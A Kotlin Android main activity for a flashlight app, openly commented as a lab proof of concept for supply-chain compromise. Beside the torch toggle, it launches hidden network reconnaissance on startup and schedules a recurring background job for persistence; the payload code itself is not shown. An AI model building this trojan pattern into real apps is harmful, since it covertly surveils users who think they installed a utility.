package com.utiltools.flashlight

import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.os.Bundle
import android.util.Log
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity
import com.utiltools.flashlight.recon.NetworkReconCollector
import com.utiltools.flashlight.schedule.ReconJobWorker

/**
 * Benign-looking "utility" app shell — delivery framing for ATT&CK Mobile
 * T1474.003 (Compromise Software Supply Chain): the PoC payload is bundled
 * into this ordinary flashlight app and sideloaded in an isolated lab.
 * https://attack.mitre.org/techniques/T1474/003/
 */
class MainActivity : AppCompatActivity() {

    private var torchOn = false
    private lateinit var cameraManager: CameraManager
    private var cameraId: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        cameraId = cameraManager.cameraIdList.firstOrNull()

        findViewById<Button>(R.id.toggleButton).setOnClickListener {
            toggleTorch()
        }

        // PoC kill-chain entry point: recon runs on launch, isolated lab only.
        NetworkReconCollector.collect(applicationContext)

        // Install phase (T1603): register the periodic background job.
        ReconJobWorker.schedule(applicationContext)
    }

    private fun toggleTorch() {
        val id = cameraId ?: return
        try {
            torchOn = !torchOn
            cameraManager.setTorchMode(id, torchOn)
        } catch (e: CameraAccessException) {
            Log.w("MainActivity", "Unable to toggle torch", e)
        }
    }
}
